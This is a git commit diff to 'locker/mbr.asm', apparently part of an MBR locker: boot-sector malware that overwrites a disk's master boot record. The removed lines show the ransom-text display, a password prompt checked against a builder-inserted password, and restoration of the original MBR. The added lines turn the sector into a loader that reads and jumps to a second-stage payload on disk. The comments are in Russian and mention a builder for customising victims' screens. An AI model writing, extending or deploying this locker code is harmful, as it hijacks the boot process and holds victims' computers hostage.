9ff2f1a2029831ede2dd5c31afc941e454ff2912
Virusodel <134794046+Virusodel@users.noreply.github.com>
2026-08-14 20:47:22 +0300

    mbr.asm

--- locker/mbr.asm
+++ locker/mbr.asm
@@ -11,175 +11,35 @@ start:
     mov sp, 0x7C00
     sti
 
-    ; Устанавливаем видеорежим
-    mov ax, 0x0003
-    int 0x10
-
-    ; Очищаем экран с черным фоном (цвет потом поменяем через билдер)
-    mov ah, 0x06
-    mov al, 0
-    mov bh, 0x00
-    mov cx, 0
-    mov dx, 0x184F
-    int 0x10
-
-    ; ============================================================
-    ; ЗАГРУЗКА ТЕКСТА (СЕКТОР 11, 512 БАЙТ)
-    ; ============================================================
+    ; ЧИТАЕМ STAGE2 (СЕКТОР 13)
     mov ax, 0x0000
     mov es, ax
-    mov bx, 0x9000
+    mov bx, 0x8000
     mov ah, 0x02
-    mov al, 1
+    mov al, 2
     mov ch, 0
-    mov cl, 11
+    mov cl, 13
     mov dh, 0
     mov dl, 0x80
     int 0x13
     jc load_error
 
-    mov si, 0x9000
-    call print
-
-    ; ============================================================
-    ; ВЫВОД "Password: "
-    ; ============================================================
-    mov ah, 0x02
-    mov bh, 0
-    mov dh, 24
-    mov dl, 0
-    int 0x10
-
-    mov si, msg_prompt
-    call print
-
-password_loop:
-    call get_password
-    call check_password
-    cmp byte [password_ok], 1
-    je restore_and_boot
-
-    mov si, msg_wrong
-    call print
-
-    mov ah, 0x02
-    mov bh, 0
-    mov dh, 24
-    mov dl, 9
-    int 0x10
-
-    jmp password_loop
+    ; ПЕРЕХОД НА STAGE2
+    jmp 0x0000:0x8000
 
 load_error:
     mov si, msg_error
     call print
     jmp hang
 
-restore_and_boot:
-    call restore_mbr
-    int 0x19
-
-restore_mbr:
-    pusha
-    mov ax, 0x0000
-    mov es, ax
-    mov bx, 0x7E00
-    mov ah, 0x02
-    mov al, 1
-    mov ch, 0
-    mov cl, 2
-    mov dh, 0
-    mov dl, 0x80
-    int 0x13
-    jc .error
-
-    mov ax, 0x0000
-    mov es, ax
-    mov bx, 0x7E00
-    mov ah, 0x03
-    mov al, 1
-    mov ch, 0
-    mov cl, 1
-    mov dh, 0
-    mov dl, 0x80
-    int 0x13
-.error:
-    popa
-    ret
-
 print:
     lodsb
     or al, al
     jz .done
     mov ah, 0x0E
-    mov bh, 0x00
-    mov bl, 0x07
     int 0x10
     jmp print
 .done:
-    ret
-
-get_password:
-    mov di, buffer
-.loop:
-    xor ax, ax
-    int 0x16
-    cmp al, 0x0D
-    je .done
-    cmp al, 0x08
-    je .backspace
-    cmp al, 0x7F
-    je .backspace
-    cmp di, buffer + 64
-    je .loop
-    stosb
-    mov ah, 0x0E
-    mov bh, 0x00
-    mov bl, 0x07
-    mov al, [di - 1]
-    int 0x10
-    jmp .loop
-.backspace:
-    cmp di, buffer
-    je .loop
-    dec di
-    mov ah, 0x0E
-    mov bh, 0x00
-    mov bl, 0x07
-    mov al, 0x08
-    int 0x10
-    mov al, ' '
-    int 0x10
-    mov al, 0x08
-    int 0x10
-    jmp .loop
-.done:
-    mov byte [di], 0
-    mov ah, 0x0E
-    mov bh, 0x00
-    mov bl, 0x07
-    mov al, 0x0A
-    int 0x10
-    mov al, 0x0D
-    int 0x10
-    ret
-
-check_password:
-    mov si, buffer
-    mov di, password
-.compare:
-    lodsb
-    or al, al
-    jz .check_end
-    cmp al, [di]
-    jne .fail
-    inc di
-    jmp .compare
-.check_end:
-    cmp byte [di], 0
-    jne .fail
-    mov byte [password_ok], 1
-.fail:
     ret
 
 hang:
@@ -187,20 +47,8 @@ hang:
     hlt
     jmp hang
 
-msg_prompt:
-    db 'Password: ',0
-msg_wrong:
-    db 'Wrong password!',13,10,0
 msg_error:
     db 'Load error!',0
 
-password:
-    db {PASSWORD_HEX}
-
-buffer:
-    times 64 db 0
-password_ok:
-    db 0
-
-times 510 - ($ - start) db 0
+times 510 - ($ - $$) db 0
 dw 0xAA55
